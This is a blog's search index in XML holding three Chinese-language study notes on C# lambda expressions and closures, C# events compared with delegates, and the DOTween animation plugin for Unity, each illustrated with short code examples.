<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Csharplambda表达式</title>
    <url>/2021/04/11/Csharplambda%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
    <content><![CDATA[<center>今天终于将委托和事件结束掉了，收获满满</center>

<a id="more"></a>

<h3 id="1-什么是lambad表达式"><a href="#1-什么是lambad表达式" class="headerlink" title="1.什么是lambad表达式?"></a>1.什么是lambad表达式?</h3><p>可以将lambad表达式 理解为匿名函数的简写<br>它除了写法不同外<br>使用上和匿名函数一模一样<br>都是和委托或者事件 配合使用的</p>
<h3 id="2-lambad表达式语法"><a href="#2-lambad表达式语法" class="headerlink" title="2.lambad表达式语法"></a>2.lambad表达式语法</h3><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">匿名函数</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">delegate</span> (参数列表)</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;;</span></pre></td></tr><tr><td class="code"><pre><span class="line">c</span></pre></td></tr><tr><td class="code"><pre><span class="line">lambad表达式</span></pre></td></tr><tr><td class="code"><pre><span class="line">(参数列表) =&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	函数体</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;;</span></pre></td></tr></table></figure>

<h3 id="3-使用"><a href="#3-使用" class="headerlink" title="3.使用"></a>3.使用</h3><p>1.无参无返回</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">Action a = () =&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	Console.WriteLine(<span class="string">"无参无返回值的lambad表达式"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">a();</span></pre></td></tr></table></figure>

<p>2.有参无返回</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">Action&lt;<span class="keyword">int</span>&gt; a2 = (<span class="keyword">int</span> <span class="keyword">value</span>) =&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	Console.WriteLine(<span class="string">"有参数Lambad表达式&#123;0&#125;"</span>, <span class="keyword">value</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;;</span></pre></td></tr><tr><td class="code"><pre><span class="line">a2(<span class="number">100</span>);</span></pre></td></tr></table></figure>

<p>3.甚至参数类型都可以省略 参数类型和委托或事件容器一致</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">Action&lt;<span class="keyword">int</span>&gt; a3 = (<span class="keyword">value</span>) =&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	Console.WriteLine(<span class="string">"省略参数类型的写法&#123;0&#125;"</span>, <span class="keyword">value</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;;</span></pre></td></tr><tr><td class="code"><pre><span class="line">a3(<span class="number">200</span>);</span></pre></td></tr></table></figure>

<p>4.有返回值</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">Func&lt;<span class="keyword">string</span>, <span class="keyword">int</span>&gt; a4 = (<span class="keyword">value</span>) =&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	Console.WriteLine(<span class="string">"有返回值有参数的那么大表达式&#123;0&#125;"</span>, <span class="keyword">value</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;;</span></pre></td></tr><tr><td class="code"><pre><span class="line">Console.WriteLine(a4(<span class="string">"123123"</span>));</span></pre></td></tr></table></figure>

<p>其它传参使用等和匿名函数一样<br>缺点也是和匿名函数一样的</p>
<h3 id="4-闭包"><a href="#4-闭包" class="headerlink" title="4.闭包"></a>4.闭包</h3><p>内层的函数可以引用包含在它外层的函数的变量<br>即使外层函数的执行已经终止<br>注意：<br>该变量提供的值并非变量创建时的值，而是在父函数范围内的最终值。</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title">Test</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="keyword">public</span> <span class="keyword">event</span> Action action;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">Test</span>(<span class="params"></span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"></span>	&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">		<span class="keyword">int</span> <span class="keyword">value</span> = <span class="number">10</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">		<span class="comment">//这里就形成了闭包</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">		<span class="comment">//因为 当构造函数执行完毕时  其中申明的临时变量value的声明周期被改变了</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">		action = () =&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">		&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">			Console.WriteLine(<span class="keyword">value</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">		&#125;;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span></pre></td></tr><tr><td class="code"><pre><span class="line">		&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">			<span class="comment">//此index 非彼index</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">			<span class="keyword">int</span> index = i;</span></pre></td></tr><tr><td class="code"><pre><span class="line">			action += () =&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">			&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">				Console.WriteLine(index);</span></pre></td></tr><tr><td class="code"><pre><span class="line">			&#125;;</span></pre></td></tr><tr><td class="code"><pre><span class="line">		&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">DoSomthing</span>(<span class="params"></span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"></span>	&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">		action();</span></pre></td></tr><tr><td class="code"><pre><span class="line">	&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>

<h3 id="5-补充知识点"><a href="#5-补充知识点" class="headerlink" title="5.补充知识点"></a>5.补充知识点</h3><p>有返回值的委托存储多个函数 调用时如何获取多个返回值？</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">Func&lt;<span class="keyword">string</span>&gt; funTest = () =&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	Console.WriteLine(<span class="string">"第一个函数"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="keyword">return</span> <span class="string">"1"</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	funTest += () =&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	Console.WriteLine(<span class="string">"第二个函数"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="keyword">return</span> <span class="string">"2"</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	funTest += () =&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	Console.WriteLine(<span class="string">"第三个函数"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="keyword">return</span> <span class="string">"3"</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;;</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//直接调用虽然会执行三个函数的逻辑</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//但返回值只能获取到最后一个</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">Console.WriteLine(funTest());</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//输出结果</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//第一个函数</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//第二个函数</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//第三个函数</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//3</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//通过GetInvocationList方法获取到委托列表</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//然后通过迭代器遍历获取到每一个函数单独执行单独获取</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (Func&lt;<span class="keyword">string</span>&gt; del <span class="keyword">in</span> funTest.GetInvocationList())</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	Console.WriteLine(del());</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//输出结果</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//第一个函数</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//1</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//第二个函数</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//2</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//第三个函数</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//3</span></span></pre></td></tr></table></figure>



<h3 id="6-总结"><a href="#6-总结" class="headerlink" title="6.总结"></a>6.总结</h3><p>匿名函数的特殊写法 就是 lambad表达式<br>固定写法 就是 (参数列表)=&gt;{}<br>参数列表 可以直接省略参数类型<br>主要在 委托传递和存储时  为了方便可以直接使用匿名函数或者lambad表达式</p>
<p>缺点：无法指定移除</p>
]]></content>
  </entry>
  <entry>
    <title>Csharp事件</title>
    <url>/2021/04/11/Csharp%E4%BA%8B%E4%BB%B6/</url>
    <content><![CDATA[<center>事件的使用</center>

<a id="more"></a>

<h3 id="1-事件是什么"><a href="#1-事件是什么" class="headerlink" title="1.事件是什么"></a>1.事件是什么</h3><p>事件是基于委托的存在<br>事件是委托的安全包裹<br>让委托的使用更具有安全性<br>事件是一种特殊的变量类型</p>
<h3 id="2-事件的使用"><a href="#2-事件的使用" class="headerlink" title="2.事件的使用"></a>2.事件的使用</h3><p>申明语法：访问修饰符 event 委托类型 事件名</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//委托成员变量 用于存储 函数的</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Action myFun;</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//事件成员变量 用于存储 函数的</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">event</span> Action myEvent;</span></pre></td></tr></table></figure>

<p>事件的使用：</p>
<p>1.事件是作为 成员变量存在于类中</p>
<p>2.委托怎么用 事件就怎么用</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Test</span>(<span class="params"></span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"></span>&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="comment">//事件的使用和委托 一模一样 只是有些 细微的区别</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">	myFun = TestFun;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	myFun += TestFun;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	myFun -= TestFun;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	myFun();</span></pre></td></tr><tr><td class="code"><pre><span class="line">	myFun.Invoke();</span></pre></td></tr><tr><td class="code"><pre><span class="line">	myFun = <span class="literal">null</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    </span></pre></td></tr><tr><td class="code"><pre><span class="line">	myEvent = TestFun;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	myEvent += TestFun;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	myEvent -= TestFun;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	myEvent();</span></pre></td></tr><tr><td class="code"><pre><span class="line">	myEvent.Invoke();</span></pre></td></tr><tr><td class="code"><pre><span class="line">	myEvent = <span class="literal">null</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">TestFun</span>(<span class="params"></span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"></span>&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    Console.WriteLine(<span class="string">"123"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>

<p>事件相对于委托的区别：</p>
<p>1.不能在类外部 赋值</p>
<p>2.不能在类外部 调用</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//将event事件封装到类中来调用</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">DoEvent</span>(<span class="params"></span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"></span>&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="keyword">if</span>(myEvent != <span class="literal">null</span>)</span></pre></td></tr><tr><td class="code"><pre><span class="line">	&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">		myEvent();</span></pre></td></tr><tr><td class="code"><pre><span class="line">	&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="keyword">string</span>[] args</span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"></span>&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	Test t = <span class="keyword">new</span> Test();</span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="comment">//委托可以在外部赋值</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">	t.myFun = <span class="literal">null</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	t.myFun = TestFun;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	t.myFun = t.myFun + TestFun;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	t.myFun += TestFun;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="comment">//事件是不能再外部赋值的</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="comment">//t.myEvent = null;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="comment">//t.myEvent = TestFun;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="comment">//虽然不能直接赋值 但是可以 加减 去添加移除记录的函数</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">	t.myEvent += TestFun;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	t.myEvent -= TestFun;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="comment">//这样也是不行的</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="comment">//t.myEvent = t.myEvent + TestFun;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="comment">//委托是可以在外部调用的</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">	t.myFun();</span></pre></td></tr><tr><td class="code"><pre><span class="line">	t.myFun.Invoke();</span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="comment">//事件不能再外部调用</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="comment">//t.myEvent();</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="comment">//只能在类的内部去封装 调用</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">	t.DoEvent();</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">TestFun</span>(<span class="params"></span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"></span>&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    </span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>

<p>注意：它只能作为成员存在于类和接口</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">Action a = TestFun;</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//事件 是不能作为临时变量在函数中使用的</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//event Action ae = TestFun;</span></span></pre></td></tr></table></figure>

<h3 id="3-为什么有事件"><a href="#3-为什么有事件" class="headerlink" title="3.为什么有事件"></a>3.为什么有事件</h3><p>防止外部随意置空委托<br>防止外部随意调用委托<br>事件相当于对委托进行了一次封装 让其更加安全</p>
<h3 id="4-总结"><a href="#4-总结" class="headerlink" title="4.总结"></a>4.总结</h3><p>事件和委托的区别<br>事件和委托的使用基本是一模一样的<br>事件就是特殊的委托<br>主要区别：<br>1.事件不能再外部使用赋值=符号，只能使用+ - 委托 哪里都能用<br>2.事件 不能再外部执行 委托哪里都能执行<br>3.事件 不能作为 函数中的临时变量的 委托可以</p>
]]></content>
  </entry>
  <entry>
    <title>DoTween学习笔记</title>
    <url>/2021/03/23/DoTween%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>系统地学习了一下DOTween插件这里做了一个整理</p>
<a id="more"></a>

<p>在使用DoTween需要引入库 <font color="red"> using DG.Tweening</font></p>
<h2 id="一、Transform"><a href="#一、Transform" class="headerlink" title="一、Transform"></a>一、Transform</h2><h3 id="1-Position"><a href="#1-Position" class="headerlink" title="1)Position"></a>1)Position</h3><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//从该点移动到Position (1,1,1),时间为2秒钟(世界坐标)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">transform.DOMove(Vector3.one,<span class="number">2f</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//从该点移动到X/Y/Z的坐标为2的点，时间为2秒钟</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">transform.DOMoveX(<span class="number">2</span>,<span class="number">2f</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">transform.DOMoveY(<span class="number">2</span>,<span class="number">2f</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">transform.DOMoveZ(<span class="number">2</span>,<span class="number">2f</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//从该点移动到Position (1,1,1),时间为2秒钟(自身坐标)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">transform.DOLocalMove(Vector3.one,<span class="number">2f</span>);</span></pre></td></tr></table></figure>

<h3 id="2-Rotation"><a href="#2-Rotation" class="headerlink" title="2)Rotation"></a>2)Rotation</h3><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//从该点旋转到Rotation (50,50,50),时间为2f，改变的是欧拉角(世界坐标)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">transform.DORotate(<span class="keyword">new</span> Vector3(<span class="number">50</span>,<span class="number">50</span>,<span class="number">50</span>),<span class="number">2f</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//四元数旋转，时间为2f</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">transform.DORotateQuaternion(<span class="keyword">new</span> Quaternion(<span class="number">0.1f</span>,<span class="number">0.1f</span>,<span class="number">0.1f</span>,<span class="number">0.1f</span>),<span class="number">2</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//从该点旋转到Rotation (50,50,50),时间为2f，改变的是欧拉角(自身坐标)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">transform.DOLocalRotate(<span class="keyword">new</span> Vector3(<span class="number">50</span>, <span class="number">50</span>, <span class="number">50</span>), <span class="number">2f</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//四元数旋转，时间为2f(自身坐标)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">transform.DOLocalRotateQuaternion(<span class="keyword">new</span> Quaternion(<span class="number">0.1f</span>, <span class="number">0.1f</span>, <span class="number">0.1f</span>, <span class="number">0.1f</span>), <span class="number">2f</span>);</span></pre></td></tr></table></figure>

<h3 id="3）Scale"><a href="#3）Scale" class="headerlink" title="3）Scale"></a>3）Scale</h3><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//从该点缩放到Scale (2,2,2)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">transform.DOScale(<span class="keyword">new</span> Vector3(<span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>), <span class="number">2f</span>);</span></pre></td></tr></table></figure>

<h3 id="4-Punch"><a href="#4-Punch" class="headerlink" title="4)Punch"></a>4)Punch</h3><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//第一个参数 punch：表示方向及强度</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//第二个参数 duration：表示动画持续时间</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//第三个参数 vibrato：震动次数</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//第四个参数 elascity: 这个值是0到1的</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">         <span class="comment">//当为0时，就是在起始点到目标点之间运动</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">         <span class="comment">//不为0时，会把你赋的值乘上一个参数，作为你运动方向反方向的点，物体在这个点和目标点之间运动</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">transform.DOPunchPosition(<span class="keyword">new</span> Vector3(<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>), <span class="number">3</span>, <span class="number">5</span>, <span class="number">1f</span>);</span></pre></td></tr></table></figure>

<p><img src="https://gitee.com/hu_hao_kai/blog-image/raw/master/img/image-20210323174008712.png" alt="image-20210323174008712"></p>
<h3 id="5-shake"><a href="#5-shake" class="headerlink" title="5)shake"></a>5)shake</h3><p>摄像机的振动也是如此</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//参数：持续时间，力量，震动，随机性，淡出</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//力量：实际就是震动的幅度,可以理解成相机施加的力的大小 使用Vector3可以选择每个轴向不同的强度</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//震动：震动次数</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//随机性：改变震动方向的随机值（大小：0~180）</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//淡出：就是运动最后是否缓慢移动回到原本位置</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">transform.DOShakePosition(<span class="number">1</span>, <span class="number">0.5f</span>, <span class="number">10</span>, <span class="number">90</span>，<span class="literal">true</span>);</span></pre></td></tr></table></figure>

<h3 id="6-Blend"><a href="#6-Blend" class="headerlink" title="6)Blend"></a>6)Blend</h3><p>将动作合并</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//最终直接移动到(-2,-2,-2)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">transform.DOMove(<span class="keyword">new</span> Vector3(<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>), <span class="number">2f</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">transform.DOMove(<span class="keyword">new</span> Vector3(<span class="number">-2</span>, <span class="number">-2</span>, <span class="number">-2</span>), <span class="number">2f</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//最终直接移动到(-1,-1,-1)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">transform.DOBlendableMoveBy(<span class="keyword">new</span> Vector3(<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>), <span class="number">2f</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">transform.DOBlendableMoveBy(<span class="keyword">new</span> Vector3(<span class="number">-2</span>, <span class="number">-2</span>, <span class="number">-2</span>), <span class="number">2f</span>);</span></pre></td></tr></table></figure>

<h2 id="二、Material"><a href="#二、Material" class="headerlink" title="二、Material"></a>二、Material</h2><h3 id="1-改变材质颜色"><a href="#1-改变材质颜色" class="headerlink" title="1)改变材质颜色"></a>1)改变材质颜色</h3><p>当Cube的Material的shader选择的是standard时</p>
<p>将材质的颜色变为红色，时间为2秒</p>
<p>mat1.DOColor(Color.red,<font color="red">“需要改变的颜色名称”</font>, 2f);</p>
<p>例：mat1.DOColor(Color.red,”_Color”, 2f);</p>
<p>当中间为_Color是默认的可省略</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">Material mat1 = GetComponent&lt;MeshRenderer&gt;().material;</span></pre></td></tr><tr><td class="code"><pre><span class="line">mat1.DOColor(Color.red, <span class="number">2f</span>);</span></pre></td></tr></table></figure>

<p><img src="https://gitee.com/hu_hao_kai/blog-image/raw/master/img/image-20210323190421550.png" alt="image-20210323190421550"></p>
<p>但是一旦将当Cube的Material的shader选择的是standard是Additive或者其他没有_Color标志的shader便不会触发</p>
<p>需要注明需要改变的颜色名称</p>
<p>例： mat1.DOColor(Color.red,”_TintColor”, 2f);</p>
<p><img src="https://gitee.com/hu_hao_kai/blog-image/raw/master/img/image-20210323191327308.png" alt="image-20210323191327308"></p>
<h3 id="2-改变材质透明度"><a href="#2-改变材质透明度" class="headerlink" title="2)改变材质透明度"></a>2)改变材质透明度</h3><p>第一种</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">mat1.DOColor(Color.clear, <span class="string">"_TintColor"</span>, <span class="number">2f</span>);</span></pre></td></tr></table></figure>

<p>第二种</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//参数：透明度，需要改变的颜色，时间</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">mat1.DOFade(<span class="number">0</span>, <span class="string">"_TintColor"</span>, <span class="number">2f</span>);</span></pre></td></tr></table></figure>

<h3 id="3-设置材质渐变动画"><a href="#3-设置材质渐变动画" class="headerlink" title="3)设置材质渐变动画"></a>3)设置材质渐变动画</h3><p>设置一个公开的变量在unity客户端中编辑颜色</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Gradient gradient;</span></pre></td></tr><tr><td class="code"><pre><span class="line">mat1.DOGradientColor(gradient, <span class="string">"_TintColor"</span>, <span class="number">2f</span>);</span></pre></td></tr></table></figure>

<p><img src="https://gitee.com/hu_hao_kai/blog-image/raw/master/img/image-20210323193444558.png" alt="image-20210323193444558"></p>
<h3 id="4-Offset"><a href="#4-Offset" class="headerlink" title="4)Offset"></a>4)Offset</h3><p>设置偏移量</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">mat1.DOOffset(<span class="keyword">new</span> Vector2(<span class="number">1</span>,<span class="number">1</span>),<span class="number">2f</span>);</span></pre></td></tr></table></figure>

<h3 id="5-Vector和混合颜色的使用"><a href="#5-Vector和混合颜色的使用" class="headerlink" title="5)Vector和混合颜色的使用"></a>5)Vector和混合颜色的使用</h3><p> 使用DOVector的Color.clear的RGBA为(0,0,0,0)将颜色在两秒后变为透明</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">mat1.DOVector(Color.clear, <span class="string">"_TintColor"</span>, <span class="number">2f</span>);</span></pre></td></tr></table></figure>

<p>DOTween会忽略掉所有DOColor而去执行最后一个DOColor</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">mat1.DOColor(Color.red, <span class="string">"_TintColor"</span>, <span class="number">2f</span>);          <span class="comment">//不执行</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">mat1.DOColor(Color.green, <span class="string">"_TintColor"</span>, <span class="number">2f</span>);        <span class="comment">//执行</span></span></pre></td></tr></table></figure>

<p>red + green = yello</p>
<p>DOBlendableColor会将所有颜色相加后最终直接输出</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">mat1.DOBlendableColor(Color.red, <span class="string">"_TintColor"</span>, <span class="number">2f</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">mat1.DOBlendableColor(Color.green, <span class="string">"_TintColor"</span>, <span class="number">2f</span>);    <span class="comment">//最终颜色输出为黄色</span></span></pre></td></tr></table></figure>

